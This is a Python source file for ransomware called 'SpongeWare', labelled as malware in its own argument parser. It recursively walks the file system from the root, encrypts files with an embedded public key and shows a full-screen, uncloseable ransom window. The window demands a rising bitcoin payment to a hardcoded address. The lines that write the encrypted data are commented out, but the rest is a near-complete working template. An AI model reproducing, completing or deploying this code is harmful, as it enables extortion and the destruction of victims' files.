### "SpongeWare"
### Peter Browning, 2021
import argparse
import pathlib
import threading
import tkinter as tk
from nacl.encoding import Base64Encoder
from nacl.exceptions import CryptoError
from nacl.public import PublicKey, SealedBox, PrivateKey
from PIL import Image

IMAGE = '{IMAGE_DATA}'
uid = '{UID}'
class Ransomware:
    file_tag = b'G3tSp0ng3d!'
    pub_key = '{PUBLIC_KEY}'

    def __init__(self, path, exclude=None, private_key=None, mode='encrypt'):
        self.pub_key = PublicKey(public_key=self.pub_key, encoder=Base64Encoder)
        self.mode = mode
        self.path = path
        if exclude is None:
            exclude = [pathlib.Path(__file__).name, ]
        self.exclude = exclude
        if private_key is not None:
            self.private_key = PrivateKey(private_key, encoder=Base64Encoder)
            if not self.validate_key(self.private_key):
                print("Private key does not match public key!")
                sys.exit(1)

    def start(self):
        self.iter_file_system(self.path)

    def iter_file_system(self, path):
        try:
            if not isinstance(path, pathlib.Path):
                path = pathlib.Path(path)
            for path in path.iterdir():
                if path.name in self.exclude:
                    continue
                if path.is_file():
                    if self.mode == 'decrypt':
                        self.decrypt(path)
                    else:
                        self.encrypt(path)
                elif path.is_dir():
                    self.iter_file_system(path)
        except:
            pass

    def is_encrypted(self, f_obj):
        ret = f_obj.read(len(self.file_tag)) == self.file_tag
        f_obj.seek(0)
        return ret

    def encrypt(self, path):
        try:
            with path.open('rb') as file:
                if self.is_encrypted(file) is True:
                    return
                data = SealedBox(self.pub_key).encrypt(file.read())
            with path.open('wb') as file:
                #file.write(self.file_tag)
                #file.write(data)
                pass
        except Exception as e:
            pass

    #LOL at this code, but it works :)
    def validate_key(self, private):
        try:
            pub = SealedBox(self.pub_key).encrypt(b"spongeware")
            return True if SealedBox(private).decrypt(pub) == b"spongeware" else False
        except CryptoError as e:
            return False


    def decrypt(self, path):
        if self.private_key is None:
            return None
        try:
            with path.open('rb') as file:
                if self.is_encrypted(file):
                    file.read(len(self.file_tag))
                    clean_data = SealedBox(self.private_key).decrypt(file.read())
            with path.open('wb') as file:
                print(f"Decrypting file: {path}")
                #file.write(clean_data)
                pass
        except Exception as e:
            pass


def is_valid_path(value):
    return pathlib.Path(value)


class Window:
    def __init__(self):
        self.root = tk.Tk()
        self.current_ransom = 1.0
        self.bot_text = 'Send {btc} to {btc_a}  to retrieve your files'
        self.btc_address = '3CPMKUtCnDjoUbiPoM2jTfvnHgfZv3vt5L'
        self.root.protocol("WM_DELETE_WINDOW", on_closing)
        self.root.resizable(0, 0)
        self.root.overrideredirect(1)
        self.total_frames = 7
        self.root.attributes('-topmost', True)
        self.w, self.h = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        self.root.geometry("%dx%d" % (self.w, self.h))
        self.root.lift()
        self.frames = []
        self.make_frames()
        self.root.config(bg='black')
        self.create_labels()

    def create_labels(self):
        self.t2 = tk.Label(self.root, text=self.bot_text.replace("{btc_a}",self.btc_address).replace("{btc}", "%.3f btc" % self.current_ransom))
        self.t = tk.Label(self.root, text="Your files have been taken by SpongeWare \n ID: %s" % uid)
        self.t.configure(bg='black', fg='red')
        self.t2.configure(bg='black', fg='red')
        self.t.config(font=("Arial", 25))
        self.t2.config(font=("Arial", 20))
        self.label = tk.Label(self.root)


    def make_frames(self):
        self.frames = [tk.PhotoImage(data=IMAGE, format='gif -index %i' % i) for i in range(self.total_frames)]

    def start(self):
        self.t.pack()
        self.label.pack()
        self.t2.pack()
        self.root.after(0,self.update,0)
        self.root.bind('<k>',self._force)
        self.root.mainloop()

    def _force(self, a):
        self.root.destroy()

    def update(self, ind):
        frame = self.frames[ind]
        ind += 1
        if ind == self.total_frames:
            ind = 1
        self.label.configure(image=frame)
        if ind % 6 == 0:
            self.current_ransom += 0.05
            self.t2.configure(text=self.bot_text.replace("{btc_a}",self.btc_address).replace("{btc}", "%.2f btc" % self.current_ransom))
        self.root.after(150, self.update, ind)

def on_closing():
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SpongeWare Malware")
    parser.add_argument('--path', help='Absolute file path to encrypt', type=is_valid_path, default=pathlib.Path.cwd().root,
                        dest='path')
    parser.add_argument('--key', help='Unlock key', type=str, default=None, dest='key')
    args = parser.parse_args()
    if args.key:
        mode = 'decrypt'
    else:
        mode = 'encrypt'
    ransom = Ransomware(args.path, private_key=args.key, mode=mode)
    t = threading.Thread(target=ransom.start)
    t.start()
    if args.key is None:
        w = Window()
        w.start()
